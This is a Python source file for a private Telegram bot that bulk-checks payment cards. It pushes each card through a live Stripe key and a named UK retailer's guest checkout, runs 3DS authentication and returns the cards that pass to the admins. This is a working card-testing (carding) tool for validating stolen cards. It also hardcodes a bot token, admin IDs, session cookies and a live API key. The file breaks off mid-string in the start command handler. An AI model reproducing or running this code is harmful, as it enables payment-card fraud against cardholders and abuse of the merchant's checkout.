import os
import sys
import asyncio
import logging
import random
import string
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import json
import base64
import urllib.parse

# ========== تفعيل Logging ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== الإعدادات ==========
BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
ADMIN_IDS = [5895491379, 844663875]

# ========== Cart ID - سيتم تحديثه تلقائياً ==========
CART_ID = ""

# ========== Cookies - تحديث حسب الحاجة ==========
COOKIES = {
    'store_switcher_popup_closed': 'closed',
    'wp_customerGroup': 'NOT%20LOGGED%20IN',
    'store': 'default',
    'geoip_store_code': 'default',
    'searchReport-log': '0',
    '_ga': 'GA1.1.1544945931.1762996300',
    '_fbp': 'fb.1.1762996300449.745185757966968218',
    'currency_code': 'GBP',
    'twk_idm_key': 'PMoLl3NLO_4dYa5TygOUk',
    '__stripe_mid': '5ba8807a-b591-46e1-8779-a46eb868a4f6906666',
    'PHPSESSID': 'p5n7rja05ajor2f0hrnpft7rvi',
    'form_key': 'zm3VIr7fkHHjLXLQ',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'form_key': 'zm3VIr7fkHHjLXLQ',
    '__stripe_sid': 'dcdc4def-0068-4228-9a2f-5faebdd7686171d9e5',
    '_gcl_au': '1.1.515112964.1762996300.1119838397.1763011991.1763011990',
    'mage-messages': '',
    '_ga_PGSR3N5SW9': 'GS2.1.s1763009923$o4$g1$t1763014172$j48$l0$h511979174',
    'sociallogin_referer_store': 'https://www.ironmongeryworld.com/door-hardware',
    '_uetsid': '464c7840becf11f08903dfcb43b5c71c',
    '_uetvid': '464c81c0becf11f08a53418e9d7cada4',
    'TawkConnectionTime': '0',
    'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763014175096%7D',
    'private_content_version': '14154d8930b9796c710c5a0e75648fd0',
    'section_data_ids': '{%22customer%22:1763014174%2C%22compare-products%22:1763014174%2C%22last-ordered-items%22:1763014174%2C%22cart%22:1763014178%2C%22directory-data%22:1763014177%2C%22captcha%22:1763014174%2C%22instant-purchase%22:1763014174%2C%22loggedAsCustomer%22:1763014174%2C%22persistent%22:1763014174%2C%22review%22:1763014174%2C%22wishlist%22:1763014174%2C%22gtm%22:1763014177%2C%22wp_confirmation_popup%22:1763014177%2C%22recently_viewed_product%22:1763014174%2C%22recently_compared_product%22:1763014174%2C%22product_data_storage%22:1763014174%2C%22paypal-billing-agreement%22:1763014174}',

}

# ========== دالة لتوليد بريد عشوائي ==========
def generate_random_email():
    """توليد بريد إلكتروني عشوائي"""
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    email = f"{random_string}@{domain}"
    return email

# ========== دالة للحصول على Quote ID الذكي ==========
def get_quote_id_smart(product_id=16124, qty=1, cookies=None):
    """
    الحصول على Quote ID بذكاء:
    - إذا السلة فيها منتجات: يجيب الـ ID مباشرة
    - إذا السلة فاضية: يضيف منتج ويجيب الـ ID
    """
    global CART_ID
    
    if cookies is None:
        cookies = COOKIES
    
    try:
        # Step 1: التحقق من السلة
        logger.info("🔍 جاري التحقق من السلة...")
        
        headers_cart = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        params = {
            'sections': 'cart',
            'force_new_section_timestamp': 'true',
            '_': str(int(time.time() * 1000)),
        }
        
        response_cart = requests.get(
            'https://www.ironmongeryworld.com/customer/section/load/',
            params=params,
            cookies=cookies,
            headers=headers_cart,
            timeout=15
        )
        
        if response_cart.status_code != 200:
            logger.error(f"❌ فشل التحقق من السلة: {response_cart.status_code}")
            return None
        
        data = response_cart.json()
        cart = data.get('cart', {})
        items_count = cart.get('summary_count', 0)
        
        # التحقق: هل السلة فارغة؟
        if items_count == 0:
            logger.warning("⚠️ السلة فارغة! سيتم إضافة منتج...")
            
            # إضافة المنتج
            headers_add = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.ironmongeryworld.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            data_add = {
                'product': str(product_id),
                'form_key': cookies.get('form_key'),
                'qty': str(qty),
            }
            
            response_add = requests.post(
                f'https://www.ironmongeryworld.com/checkout/cart/add/product/{product_id}/',
                cookies=cookies,
                headers=headers_add,
                data=data_add,
                allow_redirects=True,
                timeout=15
            )
            
            if response_add.status_code not in [200, 302]:
                logger.error(f"❌ فشل إضافة المنتج: {response_add.status_code}")
                return None
            
            logger.info(f"✅ تم إضافة المنتج {product_id}")
            time.sleep(2)
            
            # تحديث معلومات السلة
            response_cart = requests.get(
                'https://www.ironmongeryworld.com/customer/section/load/',
                params=params,
                cookies=cookies,
                headers=headers_cart,
                timeout=15
            )
            
            data = response_cart.json()
            cart = data.get('cart', {})
        else:
            logger.info(f"✅ السلة تحتوي على {items_count} منتج")
        
        # استخراج Quote ID
        quote_id = cart.get('mpquickcart', {}).get('quoteId')
        
        if quote_id:
            logger.info(f"✅ تم الحصول على Quote ID: {quote_id}")
            CART_ID = quote_id  # تحديث المتغير العام
            return quote_id
        else:
            logger.error("❌ لم يتم العثور على Quote ID")
            return None
            
    except Exception as e:
        logger.error(f"❌ خطأ في get_quote_id_smart: {e}")
        return None

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'authenticated': 0,
    'challenge': 0,
    'attempted': 0,
    'not_auth': 0,
    'unavailable': 0,
    'declined': 0,
    'rejected': 0,  # ← إضافة عداد للـ R
    'errors': 0,
    'cart_refreshed': 0,
    'cart_refresh_failed': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'authenticated_cards': [],
    'challenge_cards': [],
    'attempted_cards': [],
}

# ========== Stripe Checker Class ==========
class StripeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        }
        
    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0, max_retries=3):
        global CART_ID
        
        try:
            # توليد بريد عشوائي
            random_email = generate_random_email()
            logger.info(f"📧 Using email: {random_email}")
            logger.info(f"🔍 Checking: {card_number[:6]}****{card_number[-4:]}")
            
            # الخطوة 1: إنشاء Payment Method
            logger.info("📝 Step 1: Creating Payment Method")
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            })
            
            clean_card = card_number.replace(" ", "").replace("-", "")
            
            data = (
                f'billing_details[address][state]=London&'
                f'billing_details[address][postal_code]=SW1A+1AA&'
                f'billing_details[address][country]=GB&'
                f'billing_details[address][city]=London&'
                f'billing_details[address][line1]=111+North+Street&'
                f'billing_details[email]={random_email}&'
                f'billing_details[name]=Card+Test&'
                f'billing_details[phone]=3609998856&'
                f'type=card&'
                f'card[number]={clean_card}&'
                f'card[cvc]={cvv}&'
                f'card[exp_year]={exp_year}&'
                f'card[exp_month]={exp_month}&'
                f'allow_redisplay=unspecified&'
                f'pasted_fields=number&'
                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
                f'_stripe_version=2020-03-02'
            )
            
            r = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=25
            )
            
            logger.info(f"✅ PM Response: {r.status_code}")
            
            if r.status_code != 200:
                logger.error(f"❌ PM Failed: {r.text[:150]}")
                return 'DECLINED', 'Card declined by Stripe'
            
            pm = r.json()
            
            if 'id' not in pm:
                if 'error' in pm:
                    error_msg = pm['error'].get('message', 'Card declined')
                    logger.error(f"❌ PM Error: {error_msg}")
                    return 'DECLINED', error_msg
                return 'DECLINED', 'Invalid card'
            
            pm_id = pm['id']
            logger.info(f"✅ PM Created: {pm_id}")
            
            # الخطوة 2: إعداد معلومات الشحن أولاً
            logger.info("📦 Setting shipping information...")
            
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/json',
                'origin': 'https://www.ironmongeryworld.com',
                'referer': 'https://www.ironmongeryworld.com/onestepcheckout/',
                'x-requested-with': 'XMLHttpRequest',
            })
            
            # أولاً: نحصل على طرق الشحن المتاحة
            try:
                estimate_payload = {
                    'address': {
                        'country_id': 'GB',
                        'postcode': 'SW1A 1AA',
                        'region': 'London',
                        'region_id': 0,
                    }
                }
                
                r_estimate = self.session.post(
                    f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods',
                    headers=headers,
                    json=estimate_payload,
                    timeout=25
                )
                logger.info(f"📦 Estimate shipping: {r_estimate.status_code}")
                
                if r_estimate.status_code == 200:
                    shipping_methods = r_estimate.json()
                    if shipping_methods and len(shipping_methods) > 0:
                        # ابحث عن matrixrate أولاً
                        method = None
                        for m in shipping_methods:
                            if m.get('carrier_code') == 'matrixrate':
                                method = m
                                break
                        
                        # إذا لم نجد matrixrate، استخدم أول طريقة متاحة
                        if not method:
                            method = shipping_methods[0]
                        
                        carrier_code = method.get('carrier_code', 'matrixrate')
                        method_code = method.get('method_code', 'matrixrate_1165')
                        logger.info(f"📦 Using shipping: {carrier_code}/{method_code}")
                    else:
                        carrier_code = 'matrixrate'
                        method_code = 'matrixrate_1165'
                else:
                    carrier_code = 'matrixrate'
                    method_code = 'matrixrate_1165'
            except Exception as e:
                logger.warning(f"⚠️ Estimate error: {e}")
                carrier_code = 'matrixrate'
                method_code = 'matrixrate_1165'
            
            # ثانياً: نضع معلومات الشحن
            shipping_payload = {
                'addressInformation': {
                    'shipping_address': {
                        'countryId': 'GB',
                        'region': 'London',
                        'street': ['111 North Street'],
                        'company': '',
                        'telephone': '3609998856',
                        'postcode': 'SW1A 1AA',
                        'city': 'London',
                        'firstname': 'Card',
                        'lastname': 'Test',
                    },
                    'billing_address': {
                        'countryId': 'GB',
                        'region': 'London',
                        'street': ['111 North Street'],
                        'company': '',
                        'telephone': '3609998856',
                        'postcode': 'SW1A 1AA',
                        'city': 'London',
                        'firstname': 'Card',
                        'lastname': 'Test',
                        'saveInAddressBook': None,
                    },
                    'shipping_method_code': method_code,
                    'shipping_carrier_code': carrier_code,
                    'extension_attributes': {},
                }
            }
            
            try:
                r_shipping = self.session.post(
                    f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information',
                    headers=headers,
                    json=shipping_payload,
                    timeout=25
                )
                logger.info(f"✅ Shipping set: {r_shipping.status_code}")
                
                if r_shipping.status_code == 404:
                    logger.warning("⚠️ Cart expired during shipping setup")
                    
                    # محاولة تجديد السلة
                    if retry_count < max_retries:
                        new_cart_id = get_quote_id_smart()
                        if new_cart_id:
                            logger.info(f"✅ Cart refreshed: {new_cart_id[:20]}...")
                            stats['cart_refreshed'] += 1
                            time.sleep(2)
                            return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                    
                    return 'ERROR', '⚠️ Cart expired'
                    
            except Exception as e:
                logger.warning(f"⚠️ Shipping method error: {e}")
            
            # الخطوة 3: إنشاء Payment Intent عبر Magento
            logger.info(f"📝 Step 3: Creating Payment Intent (Cart: {CART_ID[:15]}...)")
            
            payload = {
                'cartId': CART_ID,
                'email': random_email,
                'billingAddress': {
                    'countryId': 'GB',
                    'region': 'London',
                    'street': ['111 North Street'],
                    'company': '',
                    'telephone': '3609998856',
                    'postcode': 'SW1A 1AA',
                    'city': 'London',
                    'firstname': 'Card',
                    'lastname': 'Test',
                    'email': random_email,
                    'saveInAddressBook': None,
                },
                'paymentMethod': {
                    'method': 'stripe_payments',
                    'additional_data': {
                        'payment_method': pm_id,
                    },
                },
            }
            
            r = self.session.post(
                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information',
                headers=headers,
                json=payload,
                timeout=25
            )
            
            logger.info(f"✅ PI Response: {r.status_code}")
            
            # ========== التحقق من خطأ السلة ==========
            if r.status_code not in [200, 400]:
                error_text = r.text[:300]
                logger.error(f"❌ PI Failed: {error_text}")
                
                # إذا كان الخطأ متعلق بالسلة
                if any(keyword in error_text.lower() for keyword in ['no such entity', 'not found', 'cart', 'quote']):
                    logger.warning(f"⚠️ Cart ID expired! Attempt {retry_count + 1}/{max_retries}")
                    
                    # محاولة حتى max_retries مرات
                    if retry_count < max_retries:
                        logger.info("🔄 Attempting to refresh cart...")
                        new_cart_id = get_quote_id_smart()
                        
                        if new_cart_id:
                            logger.info(f"✅ Cart refreshed successfully: {new_cart_id[:20]}...")
                            stats['cart_refreshed'] += 1
                            
                            # انتظار ثانيتين قبل إعادة المحاولة
                            time.sleep(2)
                            
                            # إعادة المحاولة مع السلة الجديدة
                            return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                        else:
                            logger.error("❌ Failed to refresh cart")
                            
                            # محاولة أخرى بعد 5 ثواني
                            if retry_count < max_retries - 1:
                                logger.info("⏳ Waiting 5 seconds before retry...")
                                time.sleep(5)
                                return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                            else:
                                stats['cart_refresh_failed'] += 1
                                return 'ERROR', '⚠️ Cart refresh failed after multiple attempts'
                    else:
                        stats['cart_refresh_failed'] += 1
                        return 'ERROR', f'⚠️ Max retries ({max_retries}) reached'
                
                if 'shipping address is missing' in error_text.lower():
                    return 'ERROR', '⚠️ Shipping address error'
                
                return 'DECLINED', 'Payment processing failed'
            
            res = r.json()
            
            if 'message' not in res:
                logger.error("❌ No message in PI response")
                return 'DECLINED', 'Payment declined'
            
            message = res['message']
            logger.info(f"📨 Message: {message[:60]}...")
            
            if 'pi_' not in message:
                # قد يكون order number
                if 'order' in message.lower() or message.isdigit():
                    logger.info("✅ Payment succeeded (order created)")
                    return 'Y', f'Payment succeeded - Order: {message}'
                return 'DECLINED', message[:100]
            
            # استخراج client_secret
            if 'Authentication Required: ' in message:
                client_secret = message.replace('Authentication Required: ', '')
            elif ': ' in message:
                client_secret = message.split(': ')[1]
            else:
                client_secret = message
            
            if '_secret_' not in client_secret:
                logger.error(f"❌ Invalid client_secret: {client_secret[:50]}")
                return 'DECLINED', 'Invalid payment intent'
            
            pi_id = client_secret.split('_secret_')[0]
            logger.info(f"✅ PI Created: {pi_id}")
            
            # الخطوة 4: الحصول على Payment Intent Details
            logger.info("📝 Step 4: Fetching Payment Intent")
            
            headers = self.headers.copy()
            headers.update({
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            params = {
                'is_stripe_sdk': 'false',
                'client_secret': client_secret,
                'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
                '_stripe_version': '2020-03-02',
            }
            
            r = self.session.get(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
                params=params,
                headers=headers,
                timeout=25
            )
            
            logger.info(f"✅ Fetch PI: {r.status_code}")
            
            if r.status_code != 200:
                logger.error(f"❌ Fetch failed: {r.text[:150]}")
                return 'DECLINED', 'Cannot fetch payment intent'
            
            pi = r.json()
            pi_status = pi.get('status', 'unknown')
            logger.info(f"📊 PI Status: {pi_status}")
            
            # التحقق من الحالة
            if 'next_action' not in pi:
                if pi_status == 'succeeded':
                    logger.info("✅ Payment succeeded without 3DS")
                    return 'Y', 'Payment succeeded'
                elif pi_status == 'requires_payment_method':
                    return 'DECLINED', 'Card declined'
                elif pi_status == 'requires_confirmation':
                    # نحتاج نعمل confirm
                    logger.info("📝 Confirming payment intent...")
                    
                    data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
                    
                    r = self.session.post(
                        f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
                        headers=headers,
                        data=data,
                        timeout=25
                    )
                    
                    if r.status_code == 200:
                        pi = r.json()
                        pi_status = pi.get('status', 'unknown')
                        logger.info(f"📊 After confirm: {pi_status}")
                        
                        if 'next_action' not in pi:
                            if pi_status == 'succeeded':
                                return 'Y', 'Payment succeeded'
                            return 'DECLINED', f'Status: {pi_status}'
                    else:
                        logger.error(f"❌ Confirm failed: {r.status_code}")
                        return 'DECLINED', 'Confirmation failed'
                else:
                    return 'DECLINED', f'Status: {pi_status}'
            
            # ========== الخطوة 5: 3DS2 Authentication - الحل الصحيح 100% ==========
            logger.info("📝 Step 5: 3DS Authentication")
            
            next_action = pi['next_action']
            
            if 'use_stripe_sdk' not in next_action:
                logger.error("❌ No use_stripe_sdk")
                return 'DECLINED', 'No 3DS data'
            
            sdk_data = next_action['use_stripe_sdk']
            
            # التحقق من نوع الـ 3DS
            if 'three_d_secure_2_source' not in sdk_data:
                logger.error("❌ No three_d_secure_2_source")
                return 'DECLINED', 'No 3DS source'
            
            source = sdk_data.get('three_d_secure_2_source', '')
            trans_id = sdk_data.get('server_transaction_id', '')
            
            logger.info(f"🔐 3DS2 Source: {source[:30]}...")
            logger.info(f"🔐 Transaction ID: {trans_id}")
            
            # ========== الحل الموحد لكل أنواع الـ 3DS ==========
            # سواء كان payatt_ أو src_، نستخدم نفس الـ endpoint
            
            if not source or not trans_id:
                logger.error("❌ Missing 3DS params")
                return 'DECLINED', 'Missing 3DS data'
            
            # إنشاء fingerprint
            fp_data = {"threeDSServerTransID": trans_id}
            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
            
            browser_data = {
                "fingerprintAttempted": True,
                "fingerprintData": fp,
                "challengeWindowSize": None,
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en",
                "browserColorDepth": "24",
                "browserScreenHeight": "786",
                "browserScreenWidth": "1397",
                "browserTZ": "-120",
                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
            
            data = (
                f'source={source}&'
                f'browser={browser_encoded}&'
                f'one_click_authn_device_support[hosted]=false&'
                f'one_click_authn_device_support[same_origin_frame]=false&'
                f'one_click_authn_device_support[spc_eligible]=true&'
                f'one_click_authn_device_support[webauthn_eligible]=true&'
                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
                f'_stripe_version=2020-03-02'
            )
            
            headers_3ds = self.headers.copy()
            headers_3ds.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            logger.info("🔐 Sending 3DS authentication request...")
            
            r = self.session.post(
                'https://api.stripe.com/v1/3ds2/authenticate',
                headers=headers_3ds,
                data=data,
                timeout=25
            )
            
            logger.info(f"✅ 3DS Auth Response: {r.status_code}")
            
            if r.status_code != 200:
                error_text = r.text[:200]
                logger.error(f"❌ 3DS failed: {error_text}")
                return 'DECLINED', '3DS auth failed'
            
            auth = r.json()
            logger.info(f"🔐 3DS Full Response: {json.dumps(auth, indent=2)}")
            
            # ========== تحليل النتيجة الصحيح 100% ==========
            
            # أولاً: التحقق من ares (Authentication Response)
            if 'ares' in auth:
                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
                logger.info(f"🎯 3DS transStatus: {trans_status}")
                
                # ========== الـ Mapping الصحيح ==========
                status_map = {
                    'Y': ('Y', '✅ Authenticated - Full verification'),
                    'C': ('C', '⚠️ Challenge Required'),
                    'A': ('A', '🔵 Attempted Authentication'),
                    'N': ('N', '❌ Not Authenticated'),
                    'U': ('U', '🔴 Unavailable'),
                    'R': ('R', '❌ Rejected by issuer'),  # ← الإصلاح الرئيسي!
                }
                
                if trans_status in status_map:
                    result = status_map[trans_status]
                    logger.info(f"✅ Final Result: {result[0]} - {result[1]}")
                    return result
                else:
                    logger.error(f"❌ Unknown transStatus: {trans_status}")
                    return ('DECLINED', f'Unknown: {trans_status}')
            
            # ثانياً: التحقق من state
            if 'state' in auth:
                state = auth.get('state', 'unknown')
                logger.info(f"📊 State: {state}")
                
                if state == 'failed':
                    # محاولة استخراج السبب من error
                    if 'error' in auth:
                        error_msg = auth['error'].get('message', 'Authentication failed')
                        logger.error(f"❌ Error: {error_msg}")
                        return 'DECLINED', f'❌ {error_msg[:50]}'
                    
                    # إذا لم يكن هناك error، نفترض أنه R
                    logger.warning("⚠️ State=failed without error, assuming R")
                    return 'R', '❌ Rejected by issuer (state=failed)'
                
                elif state == 'succeeded':
                    logger.info("✅ State=succeeded")
                    return 'Y', '✅ Authentication succeeded'
                
                else:
                    logger.warning(f"⚠️ Unknown state: {state}")
                    return 'DECLINED', f'State: {state}'
            
            # إذا لم نجد ares ولا state
            logger.error("❌ No ares or state in response")
            return 'DECLINED', 'Invalid 3DS response'
            
        except requests.exceptions.Timeout:
            logger.error("⏱️ Request timeout")
            return 'ERROR', 'Timeout - try again'
        except requests.exceptions.ConnectionError:
            logger.error("🌐 Connection error")
            return 'ERROR', 'Connection failed'
        except Exception as e:
            logger.error(f"💥 Exception: {type(e).__name__}: {str(e)[:100]}")
            return 'ERROR', f'{type(e).__name__}: {str(e)[:50]}'

async def send_result(bot_app, card, status_type, message):
    try:
        card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
        
        status_emojis = {
            'Y': ('✅', 'AUTHENTICATED CARD', 'Y - Authenticated'),
            'C': ('⚠️', 'CHALLENGE REQUIRED', 'C - Challenge Required'),
            'A': ('🔵', 'ATTEMPTED', 'A - Attempted'),
        }
        
        if status_type not in status_emojis:
            return
        
        emoji, title, status_text = status_emojis[status_type]
        
        text = (
            f"╔═══════════════════╗\n"
            f"{emoji} **{title}** {emoji}\n"
            f"╚═══════════════════╝\n\n"
            f"💳 `{card}`\n"
            f"🔥 Status: **{status_text}**\n"
            f"📊 Card #{card_number}\n"
            f"⚡️ Stripe 3DS Gateway\n"
            f"📍 {message}\n"
            f"╚═══════════════════╝"
        )
        
        if status_type == 'Y':
            stats['authenticated_cards'].append(card)
        elif status_type == 'C':
            stats['challenge_cards'].append(card)
        elif status_type == 'A':
            stats['attempted_cards'].append(card)
        
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )
        
        logger.info(f"📤 Sent result: {status_type} for {card[:15]}...")
        
    except Exception as e:
        logger.error(f"Error sending result: {e}")

async def check_card(card, bot_app):
    if not stats['is_running']:
        return card, "STOPPED", "تم الإيقاف"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
    
    # تنظيف البيانات
    card_number = card_number.replace(' ', '').replace('-', '')
    exp_month = exp_month.zfill(2)
    
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "تم الإيقاف"
        
        checker = StripeChecker()
        status, message = checker.check(card_number, exp_month, exp_year, cvv)
        
        logger.info(f"Result: {status} - {message[:50]}")
        
        # ========== إضافة R للـ handlers ==========
        status_handlers = {
            'Y': ('authenticated', 'Authenticated ✅'),
            'C': ('challenge', 'Challenge ⚠️'),
            'A': ('attempted', 'Attempted 🔵'),
            'N': ('not_auth', 'Not Auth ❌'),
            'U': ('unavailable', 'Unavailable 🔴'),
            'R': ('rejected', 'Rejected ❌'),  # ← إضافة R
            'DECLINED': ('declined', 'Declined ❌'),
        }
        
        if status in status_handlers:
            stat_key, response_text = status_handlers[status]
            stats[stat_key] += 1
            stats['checking'] -= 1
            stats['last_response'] = response_text
            await update_dashboard(bot_app)
            
            if status in ['Y', 'C', 'A']:
                await send_result(bot_app, card, status, message)
            
            return card, status, message
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status[:20]}'
            await update_dashboard(bot_app)
            return card, status, message
            
    except Exception as e:
        logger.error(f"Exception in check_card: {e}")
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"),
            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")
        ],
        [
            InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"),
            InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")
        ],
        [
            InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"),
            InlineKeyboardButton(f"❌ R: {stats['rejected']}", callback_data="rejected")  # ← إضافة R
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"🔄 Cart OK: {stats['cart_refreshed']}", callback_data="cart_refresh"),
            InlineKeyboardButton(f"❌ Cart Failed: {stats['cart_refresh_failed']}", callback_data="cart_failed")
        ],
        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    # عرض Cart ID الحالي
    keyboard.append([InlineKeyboardButton(f"🛒 Cart: {CART_ID[:15]}...", callback_data="cart_info")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh + Fixed R Status*",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.debug(f"Dashboard update skipped: {e}")

async def send_final_files(bot_app):
    try:
        file_configs = [
            ('authenticated_cards', '✅', 'Authenticated Cards (Y)'),
            ('challenge_cards', '⚠️', 'Challenge Required Cards (C)'),
            ('attempted_cards', '🔵', 'Attempted Cards (A)'),
        ]
        
        for card_type, emoji, caption in file_configs:
            cards = stats.get(f'{card_type}', [])
            if cards:
                filename = f"{card_type}.txt"
                with open(filename, "w", encoding='utf-8') as f:
                    f.write("\n".join(cards))
                
                with open(filename, "rb") as f:
                    await bot_app.bot.send_document(
                        chat_id=stats['chat_id'],
                        document=f,
                        caption=f"{emoji} **{caption}** ({len(cards)} cards)",
                        parse_mode='Markdown'
                    )
                
                os.remove(filename)
                logger.info(f"Sent file: {filename}")
        
    except Exception as e:
        logger.error(f"خطأ في إرسال الملفات: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **STRIPE 3DS CHECKER BOT**\n"
        "🔄 *With Auto Cart Refresh*\n"
        "✅ *Fixed R Status Detection*\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
